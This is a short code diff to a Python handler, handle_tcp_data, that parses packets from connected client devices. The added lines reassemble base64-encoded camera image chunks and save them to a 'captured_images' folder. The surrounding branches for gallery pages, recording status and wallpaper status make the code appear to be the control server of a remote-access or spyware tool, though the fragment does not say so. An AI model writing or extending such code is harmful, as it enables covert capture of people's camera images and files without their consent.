@@ -56,6 +56,19 @@ def handle_tcp_data(raw_line, cid):
             elif t == 'RECORD_STATUS': cd['media']['status'] = packet.get('status')
             elif t == 'GALLERY_PAGE_DATA': cd['gallery'].update(packet.get('data', packet))
             elif t == 'WALLPAPER_STATUS': cd['msgs'].insert(0, packet.get('status'))
+            elif t == 'CAMERA_IMAGE_CHUNK':
+                chunk = packet.get('chunk_data', {})
+                fname = chunk.get('filename')
+                if fname: file_transfers.setdefault(fname, []).append(chunk.get('chunk'))
+            elif t == 'CAMERA_IMAGE_END':
+                fname = packet.get('file')
+                if fname and fname in file_transfers:
+                    folder = 'captured_images'
+                    path = os.path.join(folder, secure_filename(fname))
+                    with open(path, 'wb') as f:
+                        f.write(base64.b64decode("".join(file_transfers.pop(fname))))
+                    cd['media']['last_img'] = fname
+                    add_log(f"File Saved: {fname}")
             elif 'CHUNK' in t:
                 chunk = packet.get('chunk_data', {})
                 fname = chunk.get('filename')
